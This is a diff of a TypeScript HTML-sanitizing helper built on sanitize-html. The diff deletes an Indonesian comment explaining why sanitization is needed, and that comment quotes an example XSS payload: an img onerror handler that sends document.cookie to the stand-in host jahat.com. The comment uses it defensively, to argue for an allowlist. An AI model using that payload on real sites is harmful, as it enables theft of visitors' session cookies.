@@ -1,19 +1,5 @@
 import sanitizeHtml from 'sanitize-html';
 
-/**
- * Saring HTML dari editor sebelum disimpan ke database.
- *
- * KENAPA WAJIB: HTML ini nantinya ditampilkan pakai dangerouslySetInnerHTML,
- * yang mematikan perlindungan bawaan React. Tanpa disaring, satu baris seperti
- *
- *     <img src=x onerror="fetch('https://jahat.com?c='+document.cookie)">
- *
- * bakal jalan di browser SETIAP pengunjung dan bisa mencuri cookie sesi.
- *
- * Pakai daftar-yang-diizinkan (allowlist), bukan daftar-yang-dilarang:
- * apa pun yang tidak disebut di bawah otomatis dibuang. Ini penting — kalau
- * pakai daftar larangan, selalu ada celah yang kelewat.
- */
 export function bersihkanHtml(kotor: string): string {
   return sanitizeHtml(kotor, {
     allowedTags: [
